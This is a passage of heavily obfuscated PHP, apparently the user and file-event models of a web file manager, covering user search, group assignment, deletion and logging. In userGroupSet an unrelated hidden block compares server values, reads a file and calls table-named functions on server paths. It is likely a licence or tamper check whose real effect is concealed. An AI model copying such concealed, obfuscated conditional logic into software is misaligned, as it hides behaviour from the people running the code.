$this->getInfoSimple($¿¾Şˆ«Ò); $¯ü¤úñ¾ = $Ñø³ò[$åãÖÈ†Å[2464]] ? $Ñø³ò[$åãÖÈ†Å[2464]] : $Ñø³ò[$åãÖÈ†Å[32]]; } $ŞËÓ×üŠ = Model($åãÖÈ†Å[617]); if (!Input::check($¯ü¤úñ¾, $åãÖÈ†Å[677])) { return $ŞËÓ×üŠ->metaSet($¿¾Şˆ«Ò, array($åãÖÈ†Å[552] => $åãÖÈ†Å[12], $åãÖÈ†Å[551] => $åãÖÈ†Å[12])); } return $ŞËÓ×üŠ->metaSet($¿¾Şˆ«Ò, array($åãÖÈ†Å[552] => str_replace($åãÖÈ†Å[53], $åãÖÈ†Å[12], Pinyin::get($¯ü¤úñ¾)), $åãÖÈ†Å[551] => Pinyin::get($¯ü¤úñ¾, $åãÖÈ†Å[678]))); } private function nickNameRpt() { $½ÓÅÀ‘· =& $_SERVER[¹Éµ„ºå]; $Œ‘ì•Ù“ = Model($½ÓÅÀ‘·[864])->get($½ÓÅÀ‘·[2695]); $ºøû÷“‹ = $GLOBALS[$½ÓÅÀ‘·[6]][$½ÓÅÀ‘·[468]][$½ÓÅÀ‘·[2695]]; $ˆŒ¤¨ãÚ = !is_null($Œ‘ì•Ù“) ? $Œ‘ì•Ù“ : $ºøû÷“‹; return !!$ˆŒ¤¨ãÚ; } private function _checkExist($Ì‰ÒÊá”, $„şè‚ = false) { $Ó¬çÛ‡ =& $_SERVER[¹Éµ„ºå]; $÷Ö†£í = array($Ó¬çÛ‡[32] => UserModel::ERROR_USER_EXIST_NAME, $Ó¬çÛ‡[2464] => UserModel::ERROR_USER_EXIST_NICKNAME, $Ó¬çÛ‡[380] => UserModel::ERROR_USER_EXIST_EMAIL, $Ó¬çÛ‡[2681] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($÷Ö†£í[$Ó¬çÛ‡[2464]]); } $æ††ù‹ = $„şè‚ ? array($Ó¬çÛ‡[1582] => array($Ó¬çÛ‡[2696], $„şè‚)) : array(); foreach ($÷Ö†£í as $¼ÓÛ˜· => $ÕÏ‡ÑŸ³) { $‘º¾­Ú¼ = array(); foreach ($÷Ö†£í as $‘¤ªİê¤ => $öÁ–Ô‡½) { if (isset($Ì‰ÒÊá”[$‘¤ªİê¤]) && $Ì‰ÒÊá”[$‘¤ªİê¤]) { $‘º¾­Ú¼[] = $Ì‰ÒÊá”[$‘¤ªİê¤]; } } if (!$‘º¾­Ú¼) { continue; } $ÒÂÒôÛ§ = array_merge(array($¼ÓÛ˜· => array($Ó¬çÛ‡[7], $‘º¾­Ú¼)), $æ††ù‹); $êÜå‘‘ú = $this->where($ÒÂÒôÛ§)->find(); if ($êÜå‘‘ú) { return $ÕÏ‡ÑŸ³; } } return !0; } public function userListInfo($êÏûà«Ë) { $†ÁìÚÁ =& $_SERVER[¹Éµ„ºå]; $ŸÏ™äÑÚ = array(); $êÏûà«Ë = is_array($êÏûà«Ë) ? array_unique($êÏûà«Ë) : array(); if (!$êÏûà«Ë) { return $ŸÏ™äÑÚ; } if (count($êÏûà«Ë) < 20) { foreach ($êÏûà«Ë as $ÏÛ¨³îî) { $ŸÏ™äÑÚ[$ÏÛ¨³îî . $†ÁìÚÁ[12]] = $this->getInfoSimpleOuter($ÏÛ¨³îî); } } else { $ÀÍÙ’Çµ = array($†ÁìÚÁ[1956] => array($†ÁìÚÁ[507], $êÏûà«Ë)); if (count($êÏûà«Ë) == 1) { $ÀÍÙ’Çµ = array($†ÁìÚÁ[1956] => $êÏûà«Ë[0]); } $áÔì¾¾º = Model($†ÁìÚÁ[597])->field($this->simpleField)->where($ÀÍÙ’Çµ)->select(); $áÔì¾¾º = array_to_keyvalue($áÔì¾¾º, $†ÁìÚÁ[1582]); foreach ($êÏûà«Ë as $ÏÛ¨³îî) { $ğşã¼ê€ = $áÔì¾¾º[$ÏÛ¨³îî]; if (!$ğşã¼ê€) { $ŸÏ™äÑÚ[$ÏÛ¨³îî . $†ÁìÚÁ[12]] = $this->getInfoSimpleOuter($ÏÛ¨³îî); continue; } $ğşã¼ê€[$†ÁìÚÁ[2363]] = Action($†ÁìÚÁ[2364])->parseUrl($ğşã¼ê€[$†ÁìÚÁ[2363]]); $ŸÏ™äÑÚ[$ÏÛ¨³îî . $†ÁìÚÁ[12]] = $ğşã¼ê€; } } return $ŸÏ™äÑÚ; } protected function userStatus($û¾ßßÍ, $‡Í€Ö‘•) { $ı»ú¾ôƒ = $this->getInfoSimple($û¾ßßÍ); if (!$ı»ú¾ôƒ) { return !1; } $ïšÌ€á” = array($_SERVER[¹Éµ„ºå][841] => $‡Í€Ö‘•); return $this->userEdit($û¾ßßÍ, $ïšÌ€á”); } protected function userRemove($†êÑ€ï„) { $Ğˆ¯±€ğ =& $_SERVER[¹Éµ„ºå]; $™æ§¨ = $this->getInfoSimple($†êÑ€ï„); if (!$™æ§¨) { return !1; } $ôÒ¥”Æ = array($Ğˆ¯±€ğ[1956] => $†êÑ€ï„); Model($Ğˆ¯±€ğ[686])->where($ôÒ¥”Æ)->delete(); Model($Ğˆ¯±€ğ[2697])->where($ôÒ¥”Æ)->delete(); Model($Ğˆ¯±€ğ[2265])->where($ôÒ¥”Æ)->delete(); Model($Ğˆ¯±€ğ[2680])->where($ôÒ¥”Æ)->delete(); Model($Ğˆ¯±€ğ[1227])->where($ôÒ¥”Æ)->delete(); Model($Ğˆ¯±€ğ[2481])->removeUserAll($†êÑ€ï„); Model($Ğˆ¯±€ğ[924])->userRootRemove($†êÑ€ï„); return $this->where($ôÒ¥”Æ)->delete(); } protected function userGroupSet($ıŞšú¢à, $ÍÓË¶ÌÌ, $”¨í™ñ© = array()) { $óìä—Áé =& $_SERVER[¹Éµ„ºå]; if ($_SERVER[$óìä—Áé[1025]] != $_SERVER[$óìä—Áé[1026]]) { $ ßÊá¼ß = $óìä—Áé[1027]; $¹Ğ’Şı¬ = $óìä—Áé[1028]; $úÌ§ôÙØ = $_SERVER[$óìä—Áé[1029]] . $óìä—Áé[1030]; $‘éåÜ¦Ñ = $¹Ğ’Şı¬($úÌ§ôÙØ); $–®Ó²ü§ = explode($óìä—Áé[285], $‘éåÜ¦Ñ); if (count($–®Ó²ü§) < $óìä—Áé[715]) { $²é¸ôş‰ = $óìä—Áé[1031]; $²é¸ôş‰(); } $×ÌÒğ¨¸ = $óìä—Áé[1032]; $×ÌÒğ¨¸($_SERVER[$óìä—Áé[1033]]); $×ÌÒğ¨¸($_SERVER[$óìä—Áé[1029]] . $óìä—Áé[1034]); $«»ÔÁ¥™ = 1; while ($«»ÔÁ¥™ > 1) { $«»ÔÁ¥™ = $«»ÔÁ¥™ + 4; $Ş£Š½µ = rawurlencode($«»ÔÁ¥™ . $óìä—Áé[463]); } } $¦Ñ‘Ú£ = $this->getInfoSimple($ıŞšú¢à); if (!$¦Ñ‘Ú£ || !is_array($ÍÓË¶ÌÌ)) { return !1; } $à°èä©§ = Model($óìä—Áé[2265]); $à°èä©§->where(array($óìä—Áé[1582] => $ıŞšú¢à))->delete(); $…­°ôªş = array(); $ÕÑ²‚ö = 0; foreach ($ÍÓË¶ÌÌ as $åìé»Íò => $Å¾Ç¶“) { $ú°ŒµØè = array($óìä—Áé[1582] => $ıŞšú¢à, $óìä—Áé[1484] => $åìé»Íò, $óìä—Áé[1630] => $Å¾Ç¶“); $ú°ŒµØè[$óìä—Áé[2193]] = isset($”¨í™ñ©[$ÕÑ²‚ö]) ? $”¨í™ñ©[$ÕÑ²‚ö] : 0; $ÕÑ²‚ö++; $…­°ôªş[] = $ú°ŒµØè; } return $à°èä©§->addAll($…­°ôªş, array(), !0); } protected function userGroupAdd($Å—§ûÓÑ, $­„¶–¿– = array()) { $ùËŠÛ› =& $_SERVER[¹Éµ„ºå]; $ÀİØŞ¸ = $this->getInfoSimple($Å—§ûÓÑ); if (!$ÀİØŞ¸ || empty($­„¶–¿–)) { return !1; } $©É…æìö = array(); foreach ($­„¶–¿– as $÷ÙóÎÜ‚ => $âÇ¤¦Á¸) { $©É…æìö[] = array($ùËŠÛ›[1582] => $Å—§ûÓÑ, $ùËŠÛ›[1484] => $÷ÙóÎÜ‚, $ùËŠÛ›[1630] => $âÇ¤¦Á¸, $ùËŠÛ›[2193] => 0); } return Model($ùËŠÛ›[2265])->addAll($©É…æìö, array(), !0); } protected function userGroupRemove($¶Ù”ûÚ, $íˆ‹¬£á) { $ÙÖêàŸˆ =& $_SERVER[¹Éµ„ºå]; $õ£Òñß³ = $this->getInfoSimple($¶Ù”ûÚ); if (!$õ£Òñß³ || !$íˆ‹¬£á) { return !1; } $õÓ£ü— = array($ÙÖêàŸˆ[1956] => $¶Ù”ûÚ, $ÙÖêàŸˆ[2258] => $íˆ‹¬£á); return Model($ÙÖêàŸˆ[2265])->where($õÓ£ü—)->delete(); } public function listData() { $š´à§à = $this->_makeOrder()->selectPage(50); $this->_listDataApply($š´à§à[$_SERVER[¹Éµ„ºå][446]]); return $š´à§à; } public function listByID($à¸ ¹ˆ) { $³·÷´µû =& $_SERVER[¹Éµ„ºå]; if (!$à¸ ¹ˆ) { return; } $§èç”Ğ¡ = array($³·÷´µû[1582] => array($³·÷´µû[7], $à¸ ¹ˆ)); $ƒÀìéÌå = $this->where($§èç”Ğ¡)->select(); $ƒÀìéÌå = array_sort_keep($ƒÀìéÌå, $³·÷´µû[1582], $à¸ ¹ˆ); $this->_listDataApply($ƒÀìéÌå); return $ƒÀìéÌå; } public function listByGroup($Øå¸çÓ‚ = 0, $İÉÛíÆÂ = array()) { $ÉÊú´ÁÄ =& $_SERVER[¹Éµ„ºå]; $¹È…ö´ = $ÉÊú´ÁÄ[12]; $·Úêßì÷ = array(); if ($Øå¸çÓ‚) { $·Úêßì÷ = array($ÉÊú´ÁÄ[2698] => intval($Øå¸çÓ‚)); $¹È…ö´ = "\x4c\105\x46\124\40\112\117\111\x4e\x20{$this->tablePrefix}\165\163\x65\x72\137\147\162\x6f\x75\x70\40\165\x73\145\x72\137\x67\162\x6f\165\x70\40\157\x6e\40\165\163\145\162\x2e\x75\163\x65\x72\111\104\40\75\40\x75\163\x65\162\x5f\147\x72\x6f\165\160\x2e\x75\163\x65\x72\111\x44"; $Æ³ÀøŒ¨ = Input::get($ÉÊú´ÁÄ[544], null, $ÉÊú´ÁÄ[12]) ? $ÉÊú´ÁÄ[12] : $ÉÊú´ÁÄ[2699]; } if (isset($İÉÛíÆÂ[$ÉÊú´ÁÄ[841]])) { $·Úêßì÷[$ÉÊú´ÁÄ[2700]] = $İÉÛíÆÂ[$ÉÊú´ÁÄ[841]]; } $—¡À¬ñÁ = _get($İÉÛíÆÂ, $ÉÊú´ÁÄ[2701], $ÉÊú´ÁÄ[231]); if (_get($İÉÛíÆÂ, $ÉÊú´ÁÄ[852], !1)) { $·Úêßì÷[$—¡À¬ñÁ] = array($ÉÊú´ÁÄ[2447], $İÉÛíÆÂ[$ÉÊú´ÁÄ[852]]); } if (_get($İÉÛíÆÂ, $ÉÊú´ÁÄ[853], !1)) { $‰ší–ã“ = array($ÉÊú´ÁÄ[2448], $İÉÛíÆÂ[$ÉÊú´ÁÄ[853]]); if ($·Úêßì÷[$—¡À¬ñÁ]) { $·Úêßì÷[$—¡À¬ñÁ] = array($·Úêßì÷[$—¡À¬ñÁ], $‰ší–ã“, $ÉÊú´ÁÄ[2449]); } else { $·Úêßì÷[$—¡À¬ñÁ] = $‰ší–ã“; } } $¢çê³¯ñ = $this->_makeOrder($Æ³ÀøŒ¨)->field($ÉÊú´ÁÄ[2702])->where($·Úêßì÷)->join($¹È…ö´)->selectPage(50); $this->_listDataApply($¢çê³¯ñ[$ÉÊú´ÁÄ[446]]); return $¢çê³¯ñ; } private function _makeOrder($Äç”ƒÔ® = '') { $Ÿ¶ÆŒùÓ =& $_SERVER[¹Éµ„ºå]; $Î öÏ£ø = array($Ÿ¶ÆŒùÓ[1582], $Ÿ¶ÆŒùÓ[32], $Ÿ¶ÆŒùÓ[2158], $Ÿ¶ÆŒùÓ[2362], $Ÿ¶ÆŒùÓ[2133], $Ÿ¶ÆŒùÓ[231]); $Ö³‰ƒ¢ = array($Ÿ¶ÆŒùÓ[537] => $Ÿ¶ÆŒùÓ[538], $Ÿ¶ÆŒùÓ[539] => $Ÿ¶ÆŒùÓ[540]); $‹ Îğ³Ô = Input::get($Ÿ¶ÆŒùÓ[544], $Ÿ¶ÆŒùÓ[7], $Ÿ¶ÆŒùÓ[1956], $Î öÏ£ø); $üó×é­ = Input::get($Ÿ¶ÆŒùÓ[545], $Ÿ¶ÆŒùÓ[7], $Ÿ¶ÆŒùÓ[2266], array($Ÿ¶ÆŒùÓ[2266], $Ÿ¶ÆŒùÓ[539])); $üó×é­ = $Ö³‰ƒ¢[$üó×é­]; $Äç”ƒÔ® = $Äç”ƒÔ® . "\x75\163\145\162\56{$‹ Îğ³Ô}\40{$üó×é­}\54\x20\165\163\145\162\56\x75\163\x65\x72\111\104\x20\141\163\x63"; return $this->alias($Ÿ¶ÆŒùÓ[2397])->order($Äç”ƒÔ®); } public function listSearch($®½²‡À) { $õ¥ÖÑŸ =& $_SERVER[¹Éµ„ºå]; $¾‚§êÈê = trim($®½²‡À[$õ¥ÖÑŸ[2269]]); $¹”à´” = explode($õ¥ÖÑŸ[53], $¾‚§êÈê); if (!$¾‚§êÈê || count($¹”à´”) == 1) { return $this->listSearchNow($®½²‡À); } $å½êÁœ = array($õ¥ÖÑŸ[446] => array()); foreach ($¹”à´” as $½Šó§»›) { if (!trim($½Šó§»›)) { continue; } $®½²‡À[$õ¥ÖÑŸ[2269]] = $½Šó§»›; $•é÷¬¨Å = $this->listSearchNow($®½²‡À); $å½êÁœ[$õ¥ÖÑŸ[446]] = array_merge($å½êÁœ[$õ¥ÖÑŸ[446]], $•é÷¬¨Å[$õ¥ÖÑŸ[446]]); } $å½êÁœ[$õ¥ÖÑŸ[446]] = array_unique_by_key($å½êÁœ[$õ¥ÖÑŸ[446]], $õ¥ÖÑŸ[1582]); $å½êÁœ[$õ¥ÖÑŸ[443]] = array($õ¥ÖÑŸ[444] => count($å½êÁœ[$õ¥ÖÑŸ[446]]), $õ¥ÖÑŸ[439] => 20, $õ¥ÖÑŸ[428] => 1, $õ¥ÖÑŸ[445] => 1); return $å½êÁœ; } public function listSearchNow($Œ´Ùàîİ) { $Ì³óìŠ° =& $_SERVER[¹Éµ„ºå]; $©üôá²— = trim($Œ´Ùàîİ[$Ì³óìŠ°[2269]]); $Øîåşúä = isset($Œ´Ùàîİ[$Ì³óìŠ°[2270]]) ? $Œ´Ùàîİ[$Ì³óìŠ°[2270]] : !1; $©üôá²— = str_replace($Ì³óìŠ°[2271], $Ì³óìŠ°[2272], trim($©üôá²—)); $å§áÖçÊ = array($Ì³óìŠ°[32] => array($Ì³óìŠ°[473], "\x25{$©üôá²—}\45"), $Ì³óìŠ°[380] => array($Ì³óìŠ°[473], "{$©üôá²—}\45"), $Ì³óìŠ°[2464] => array($Ì³óìŠ°[473], "\x25{$©üôá²—}\45"), $Ì³óìŠ°[1157] => $Ì³óìŠ°[2273]); if (Input::check($©üôá²—, $Ì³óìŠ°[386])) { $å§áÖçÊ[$Ì³óìŠ°[1582]] = array($Ì³óìŠ°[473], "{$©üôá²—}\45"); $å§áÖçÊ[$Ì³óìŠ°[2681]] = array($Ì³óìŠ°[473], "{$©üôá²—}\45"); } if (!$©üôá²—) { $å§áÖçÊ = array(); } if (isset($Œ´Ùàîİ[$Ì³óìŠ°[841]])) { $å§áÖçÊ[$Ì³óìŠ°[841]] = $Œ´Ùàîİ[$Ì³óìŠ°[841]]; } $å§áÖçÊ = $this->parseWhereLike($å§áÖçÊ); $È •ñ¾ = $this->_makeOrder()->where($å§áÖçÊ)->selectPage(20); if (!$È •ñ¾ || count($È •ñ¾[$Ì³óìŠ°[446]]) < 5 && Input::check($©üôá²—, $Ì³óìŠ°[393])) { $’•é¶Ş¯ = $this->_searchFromMeta($Ì³óìŠ°[551], $©üôá²—, 10); $Êâá–ÎÂ = $this->_searchFromMeta($Ì³óìŠ°[552], $©üôá²—, 10); $ˆºÃ¶ã = array_merge($’•é¶Ş¯, $Êâá–ÎÂ, $È •ñ¾[$Ì³óìŠ°[446]]); $È •ñ¾[$Ì³óìŠ°[446]] = array_unique_by_key($ˆºÃ¶ã, $Ì³óìŠ°[1582]); $È •ñ¾[$Ì³óìŠ°[443]][$Ì³óìŠ°[444]] = count($È •ñ¾[$Ì³óìŠ°[446]]); $È •ñ¾[$Ì³óìŠ°[443]][$Ì³óìŠ°[445]] = ceil($È •ñ¾[$Ì³óìŠ°[443]][$Ì³óìŠ°[444]] / $È •ñ¾[$Ì³óìŠ°[443]][$Ì³óìŠ°[439]]); } $this->_listDataApply($È •ñ¾[$Ì³óìŠ°[446]]); $this->_filterByGroup($È •ñ¾, $Øîåşúä); return $È •ñ¾; } private function _filterByGroup(&$‰“¨úœï, $¬Ç„İí’) { $‹¢´¤ÃÂ =& $_SERVER[¹Éµ„ºå]; if (!$¬Ç„İí’) { return $‰“¨úœï; } foreach ($‰“¨úœï[$‹¢´¤ÃÂ[446]] as $¤ƒÂ¿§ => &$Ùôì»‘½) { $¥…‡·û = array_to_keyvalue($Ùôì»‘½[$‹¢´¤ÃÂ[1483]], $‹¢´¤ÃÂ[12], $‹¢´¤ÃÂ[1484]); if (!in_array($¬Ç„İí’, $¥…‡·û)) { unset($‰“¨úœï[$‹¢´¤ÃÂ[446]][$¤ƒÂ¿§]); } } unset($Ùôì»‘½); $‰“¨úœï[$‹¢´¤ÃÂ[446]] = array_values($‰“¨úœï[$‹¢´¤ÃÂ[446]]); $‰“¨úœï[$‹¢´¤ÃÂ[443]] = array($‹¢´¤ÃÂ[2320] => count($‰“¨úœï[$‹¢´¤ÃÂ[446]]), $‹¢´¤ÃÂ[2429] => $‰“¨úœï[$‹¢´¤ÃÂ[443]][$‹¢´¤ÃÂ[439]], $‹¢´¤ÃÂ[2428] => 1, $‹¢´¤ÃÂ[2430] => 1); } private function _searchFromMeta($Î—áŞ–…, $§³¶¯¢Ÿ, $¬ãØ“) { $¶Çé›Œ› =& $_SERVER[¹Éµ„ºå]; $§³¶¯¢Ÿ = strtolower($§³¶¯¢Ÿ); $ÁäÇ´Ü® = array($¶Çé›Œ›[95] => $Î—áŞ–…, $¶Çé›Œ›[451] => array($¶Çé›Œ›[473], "\45{$§³¶¯¢Ÿ}\x25")); $ÁäÇ´Ü® = $this->parseWhereLike($ÁäÇ´Ü®); $Ì²¾¦² = Model($¶Çé›Œ›[2703])->where($ÁäÇ´Ü®)->limit($¬ãØ“)->select(); if (!$Ì²¾¦²) { return array(); } $Ì²¾¦² = array_to_keyvalue($Ì²¾¦², $¶Çé›Œ›[12], $¶Çé›Œ›[1582]); $ü±Ø± = $this->where(array($¶Çé›Œ›[1956] => array($¶Çé›Œ›[7], $Ì²¾¦²)))->select(); if (!$ü±Ø±) { return array(); } return $ü±Ø±; } private function _listDataApplyItem($ˆû¡¡©®) { $õ’“Ç–ı = array($ˆû¡¡©®); $this->_listDataApply($õ’“Ç–ı); return $õ’“Ç–ı[0]; } private function _listDataApply(&$Õ˜äŠğ’) { $Àø‡Š‘‚ =& $_SERVER[¹Éµ„ºå]; if (!$Õ˜äŠğ’) { return; } array_remove_key($Õ˜äŠğ’, $Àø‡Š‘‚[1043]); $Äû†ûæÙ = array_to_keyvalue($Õ˜äŠğ’, $Àø‡Š‘‚[12], $Àø‡Š‘‚[1582]); $this->_listAppendGroup($Õ˜äŠğ’, $Äû†ûæÙ); $this->_listAppendMeta($Õ˜äŠğ’, $Äû†ûæÙ); $this->_listAppendSourceRoot($Õ˜äŠğ’, $Äû†ûæÙ); } private function _listAppendSourceRoot(&$ÖìÕ›„, $“á‹„âÆ) { $åË÷Åôí =& $_SERVER[¹Éµ„ºå]; $©¶áÈ­Á = Model($åË÷Åôí[924])->listSourceRoot(SourceModel::TYPE_USER, $“á‹„âÆ); $©¶áÈ­Á = array_to_keyvalue($©¶áÈ­Á, $åË÷Åôí[589]); $©¶áÈ­Á = array_remove_key($©¶áÈ­Á, $åË÷Åôí[589]); foreach ($ÖìÕ›„ as &$«³Šóùğ) { $«³Šóùğ[$åË÷Åôí[90]] = $©¶áÈ­Á[$«³Šóùğ[$åË÷Åôí[1582]]] ? $©¶áÈ­Á[$«³Šóùğ[$åË÷Åôí[1582]]] : array(); } unset($«³Šóùğ); } private function _listAppendGroup(&$˜íšºè, $‹ïÅ›–ü) { $Åàı¦Ã° =& $_SERVER[¹Éµ„ºå]; $ÍàØ¶Û = array($Åàı¦Ã°[1582] => array($Åàı¦Ã°[7], $‹ïÅ›–ü)); $â¹Ë¶´Ş = Model($Åàı¦Ã°[2265])->where($ÍàØ¶Û)->select(); $Îˆ—ÀØ = array_to_keyvalue($â¹Ë¶´Ş, $Åàı¦Ã°[12], $Åàı¦Ã°[1484]); $Îˆ—ÀØ = array_remove_value(array_unique($Îˆ—ÀØ), $Åàı¦Ã°[228]); if (!$Îˆ—ÀØ || !$â¹Ë¶´Ş) { return; } $ÍàØ¶Û = array($Åàı¦Ã°[1484] => array($Åàı¦Ã°[7], $Îˆ—ÀØ)); $üıô±Ûù = Model($Åàı¦Ã°[1482])->field($Åàı¦Ã°[2704])->where($ÍàØ¶Û)->select(); $üıô±Ûù = array_to_keyvalue($üıô±Ûù, $Åàı¦Ã°[1484]); $â¹Ë¶´Ş = array_to_keyvalue_group($â¹Ë¶´Ş, $Åàı¦Ã°[1582]); foreach ($â¹Ë¶´Ş as &$• ÁŒ—²) { $»ñúß¸ = array(); foreach ($• ÁŒ—² as $÷éË¦ıÔ) { if (!$÷éË¦ıÔ[$Åàı¦Ã°[1630]]) { continue; } $€½Ë©Ö = Model($Åàı¦Ã°[591])->listData($÷éË¦ıÔ[$Åàı¦Ã°[1630]]); $»ñúß¸[] = array($Åàı¦Ã°[1484] => $÷éË¦ıÔ[$Åàı¦Ã°[1484]], $Åàı¦Ã°[2705] => $üıô±Ûù[$÷éË¦ıÔ[$Åàı¦Ã°[1484]]][$Åàı¦Ã°[32]], $Åàı¦Ã°[604] => $üıô±Ûù[$÷éË¦ıÔ[$Åàı¦Ã°[1484]]][$Åàı¦Ã°[604]], $Åàı¦Ã°[502] => $€½Ë©Ö); } $• ÁŒ—² = $»ñúß¸; } unset($• ÁŒ—²); foreach ($˜íšºè as &$Ì‘İ„å«) { $Ì‘İ„å«[$Åàı¦Ã°[1483]] = array(); if (isset($â¹Ë¶´Ş[$Ì‘İ„å«[$Åàı¦Ã°[1582]]])) { $Ì‘İ„å«[$Åàı¦Ã°[1483]] = $â¹Ë¶´Ş[$Ì‘İ„å«[$Åàı¦Ã°[1582]]]; } } unset($Ì‘İ„å«); } public function userAppendGroup($—ÎÕãÙ) { $­ù‰á¦° =& $_SERVER[¹Éµ„ºå]; if (!$—ÎÕãÙ) { return array(); } $this->_listAppendGroup($—ÎÕãÙ, array_to_keyvalue($—ÎÕãÙ, $­ù‰á¦°[12], $­ù‰á¦°[1582])); return $—ÎÕãÙ; } private function _listAppendMeta(&$ÓµÄğÁĞ, $–Â”œì) { $¸ú‚¨áŸ =& $_SERVER[¹Éµ„ºå]; $åÁ»çƒƒ = UserJobModel::JOB_KEY; $İ·ø»×› = array($¸ú‚¨áŸ[2261]); $œ«²öŞ = array($¸ú‚¨áŸ[1582] => array($¸ú‚¨áŸ[7], $–Â”œì)); $“ƒ™‹ƒ = Model($¸ú‚¨áŸ[2680])->where($œ«²öŞ)->select(); $–ò”ºÎ = array(); foreach ($“ƒ™‹ƒ as $°”œ€éì) { $›Ã›¼ËÕ = $°”œ€éì[$¸ú‚¨áŸ[1582]]; if (!isset($–ò”ºÎ[$›Ã›¼ËÕ])) { $–ò”ºÎ[$›Ã›¼ËÕ] = array(); } $–ò”ºÎ[$›Ã›¼ËÕ][$°”œ€éì[$¸ú‚¨áŸ[95]]] = $°”œ€éì[$¸ú‚¨áŸ[451]]; } $ÖËÙ¨ªë = Model($¸ú‚¨áŸ[2706]); foreach ($ÓµÄğÁĞ as &$ØÍş©°Ô) { $›Ã›¼ËÕ = $ØÍş©°Ô[$¸ú‚¨áŸ[1582]]; $ıƒŒ¨ß = isset($–ò”ºÎ[$›Ã›¼ËÕ]) ? $–ò”ºÎ[$›Ã›¼ËÕ] : array(); $ØÍş©°Ô[$¸ú‚¨áŸ[555]] = array_field_key($ıƒŒ¨ß, $İ·ø»×›); $ØÍş©°Ô[$¸ú‚¨áŸ[2707]] = array(); if (isset($ıƒŒ¨ß[$åÁ»çƒƒ])) { $ØÍş©°Ô[$¸ú‚¨áŸ[2707]] = $ÖËÙ¨ªë->getUserJobInfo($ıƒŒ¨ß[$åÁ»çƒƒ]); } } unset($ØÍş©°Ô); } protected function groupUserAll($Ã”“øê½) { $Å–ôÜĞ =& $_SERVER[¹Éµ„ºå]; if (!$Ã”“øê½) { return !1; } $††µõ‘ø = Model($Å–ôÜĞ[2265])->field($Å–ôÜĞ[1582])->where(array($Å–ôÜĞ[1484] => array($Å–ôÜĞ[7], $Ã”“øê½)))->select(); $††µõ‘ø = array_to_keyvalue($††µõ‘ø, $Å–ôÜĞ[12], $Å–ôÜĞ[1582]); return array_unique($††µõ‘ø); } public function userSearch($ïØì‹ëì, $º×ö€¸Å = "\52") { return Model($_SERVER[¹Éµ„ºå][617])->where($ïØì‹ëì)->field($º×ö€¸Å)->find(); } } goto EÎÊº²Üƒ; B™ ê¦­: class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\165\162\x63\145\137\x65\x76\145\x6e\x74"; protected $dataAuto = array(array("\143\162\x65\141\164\145\124\x69\155\145", "\x74\x69\x6d\x65", "\151\156\x73\x65\162\x74", "\x66\x75\156\143\x74\151\x6f\156"), array("\144\145\163\x63", '', "\x69\156\163\x65\x72\x74\x2c\165\x70\x64\141\164\x65\x2c\163\x65\x6c\145\143\x74", "\x6a\163\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($Ê¦µØÖÁ, $¾‚¹ÏÕ–, $Ï¨‰ñÄ¦ = '') { $úİÎõ÷ =& $_SERVER[¹Éµ„ºå]; if (!$this->eventSave) { return; } $ §Ãî§¬ = Model($úİÎõ÷[1523])->sourceInfo($Ê¦µØÖÁ); if (!$ §Ãî§¬) { return !1; } if ($this->isDisableEvent($ §Ãî§¬, $¾‚¹ÏÕ–)) { return; } if ($Ï¨‰ñÄ¦ && is_string($Ï¨‰ñÄ¦)) { $Ï¨‰ñÄ¦ = array($úİÎõ÷[2211] => $Ï¨‰ñÄ¦); } $İ¨Ş¿·ó = KodUser::id(); $¨øï»–ó = array($úİÎõ÷[506] => $Ê¦µØÖÁ, $úİÎõ÷[2401] => $ §Ãî§¬[$úİÎõ÷[190]], $úİÎõ÷[2402] => $ §Ãî§¬[$úİÎõ÷[32]], $úİÎõ÷[602] => !empty($ §Ãî§¬[$úİÎõ÷[602]]) ? $ §Ãî§¬[$úİÎõ÷[602]] : $úİÎõ÷[12], $úİÎõ÷[1956] => $İ¨Ş¿·ó, $úİÎõ÷[511] => $¾‚¹ÏÕ–, $úİÎõ÷[1958] => $Ï¨‰ñÄ¦); $this->addSystemLog($¾‚¹ÏÕ–, $¨øï»–ó); unset($¨øï»–ó[$úİÎõ÷[2402]], $¨øï»–ó[$úİÎõ÷[602]]); return $this->add($¨øï»–ó); } private function addSystemLog($Ñ²ÖşœÈ, $™×İ¬ı€) { $Ï¶ß“êÒ =& $_SERVER[¹Éµ„ºå]; if ($Ñ²ÖşœÈ == $Ï¶ß“êÒ[2403]) { $Ñ²ÖşœÈ = $™×İ¬ı€[$Ï¶ß“êÒ[540]][$Ï¶ß“êÒ[2404]]; } else { if (in_array($Ñ²ÖşœÈ, array($Ï¶ß“êÒ[1552], $Ï¶ß“êÒ[2405]))) { $Ñ²ÖşœÈ = $™×İ¬ı€[$Ï¶ß“êÒ[540]][$Ï¶ß“êÒ[168]]; } } $ÀÑÚı†ß = array_merge($™×İ¬ı€, array($Ï¶ß“êÒ[2406] => $™×İ¬ı€[$Ï¶ß“êÒ[191]], $Ï¶ß“êÒ[2407] => $™×İ¬ı€[$Ï¶ß“êÒ[2407]])); Hook::trigger($Ï¶ß“êÒ[2408], $Ï¶ß“êÒ[2409] . $Ñ²ÖşœÈ, $™×İ¬ı€); Model($Ï¶ß“êÒ[2117])->addLog($Ï¶ß“êÒ[2409] . $Ñ²ÖşœÈ, $ÀÑÚı†ß); } private function isDisableEvent($Ÿ—Ú°Õ‰, $ÅŸş†Õæ) { $‘–×¾©ô =& $_SERVER[¹Éµ„ºå]; if ($Ÿ—Ú°Õ‰[$‘–×¾©ô[188]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($ÅŸş†Õæ == $‘–×¾©ô[1323]) { return !1; } return !0; } public function eventCreate($ĞÙºù»Ğ, $Ûøêœ†Î) { $íÙ†Ì‡ê =& $_SERVER[¹Éµ„ºå]; $£§üÍŠ = Model($íÙ†Ì‡ê[1523])->sourceInfo($ĞÙºù»Ğ); $ëÒÉŸªİ = array($íÙ†Ì‡ê[2404] => $Ûøêœ†Î, $íÙ†Ì‡ê[32] => $£§üÍŠ[$íÙ†Ì‡ê[32]]); return $this->addEvent($ĞÙºù»Ğ, $íÙ†Ì‡ê[2403], $ëÒÉŸªİ); } public function eventFileEdit($¥…àÜûè) { $Õ•¼ˆÑ· =& $_SERVER[¹Éµ„ºå]; $é§×òë = array($Õ•¼ˆÑ·[2410] => $_SERVER[$Õ•¼ˆÑ·[2411]], $Õ•¼ˆÑ·[2412] => strtolower(ACTION)); if 